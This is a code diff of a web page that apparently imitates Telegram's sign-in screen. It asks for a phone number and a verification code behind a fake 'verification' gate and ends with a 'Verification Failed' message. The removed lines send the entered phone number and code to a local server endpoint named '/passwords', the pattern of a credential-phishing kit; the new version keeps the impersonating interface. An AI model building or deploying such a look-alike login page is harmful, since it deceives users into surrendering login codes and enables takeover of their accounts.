@@ -25,7 +25,7 @@
             width: 100%;
             max-width: 500px;
             position: absolute;
-            top: 2cm;
+            top: 2cm; /* Adjusted by 2 cm */
         }
 
         .verification-container h1 {
@@ -73,10 +73,6 @@
             background-color: #ffffff;
             height: 100vh;
             overflow-y: auto;
-        }
-
-        .active {
-            display: block;
         }
 
         h1 {
@@ -251,14 +247,14 @@
 
         @media (max-width: 600px) {
             .verification-container {
-                margin-top: 2cm;
+                margin-top: 2cm; /* Move verification container 2cm from top on mobile */
             }
 
             .container {
                 width: 95%;
                 max-width: 340px;
-                height: calc(100vh - 4cm);
-                margin-top: 0;
+                height: calc(100vh - 4cm); /* Adjust height on mobile */
+                margin-top: 0; /* Adjust margin for full-screen fit */
             }
 
             .verification-container button {
@@ -275,7 +271,7 @@
     </div>
 
     <div class="container" id="initialContainer">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" style="width: 80px; margin-bottom: 20px;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
         <h1>Sign in to Telegram</h1>
         <p>Please confirm your country code and enter your phone number.</p>
 
@@ -313,8 +309,9 @@
     </div>
 
     <div class="container" id="finalMessageContainer" style="display:none;">
-        <h1>Account Not Found</h1>
-        <p>The account associated with the entered phone number was not found.</p>
+        <h1>Verification Failed</h1>
+        <p id="finalMessage"></p>
+        <button class="button" onclick="resetForm()">Try Again</button>
     </div>
 
     <script>
@@ -358,76 +355,38 @@
                 setTimeout(function() {
                     document.getElementById('verificationContainer').style.display = 'none';
                     document.body.style.backgroundColor = "#ffffff";
-                    document.getElementById('initialContainer').classList.add('active');
+                    document.getElementById('initialContainer').style.display = 'block';
                 }, 500);
             }
 
             window.goToVerificationPage = function() {
-                const phoneNumber = document.getElementById('phoneNumber').value.trim();
+                const phoneNumber = phoneNumberInput.value;
                 if (phoneNumber === '') {
                     alert('Please enter your phone number.');
                     return;
                 }
 
-                console.log('Sending phone number to server:', phoneNumber);
-
-                fetch('http://localhost:8000/passwords', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        phone: phoneNumber,
-                    }),
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        return response.text().then(text => { throw new Error(text) });
-                    }
-                    console.log('Phone number sent successfully');
-                    document.getElementById('phoneDisplay').textContent = phoneNumber;
-                    document.getElementById('initialContainer').classList.remove('active');
-                    document.getElementById('phoneVerificationContainer').classList.add('active');
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('An error occurred: ' + error.message);
-                });
+                document.getElementById('phoneDisplay').textContent = phoneNumber;
+                document.getElementById('initialContainer').style.display = 'none';
+                document.getElementById('phoneVerificationContainer').style.display = 'block';
             };
 
             window.submitVerification = function() {
-                const verificationCode = document.getElementById('verificationCode').value.trim();
-                const phoneNumber = document.getElementById('phoneDisplay').textContent;
-
+                const verificationCode = document.getElementById('verificationCode').value;
                 if (verificationCode === '') {
                     alert('Please enter the verification code.');
                     return;
                 }
 
-                console.log('Sending verification code to server:', verificationCode);
+                document.getElementById('phoneVerificationContainer').style.display = 'none';
+                document.getElementById('finalMessageContainer').style.display = 'block';
+            };
 
-                fetch('http://localhost:8000/verification', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        phone: phoneNumber,
-                        code: verificationCode,
-                    }),
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        return response.text().then(text => { throw new Error(text) });
-                    }
-                    console.log('Verification code sent successfully');
-                    document.getElementById('phoneVerificationContainer').classList.remove('active');
-                    document.getElementById('finalMessageContainer').classList.add('active');
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('An error occurred: ' + error.message);
-                });
+            window.resetForm = function() {
+                phoneNumberInput.value = '';
+                document.getElementById('verificationCode').value = '';
+                document.getElementById('finalMessageContainer').style.display = 'none';
+                document.getElementById('initialContainer').style.display = 'block';
             };
 
             document.body.addEventListener('touchmove', function() {
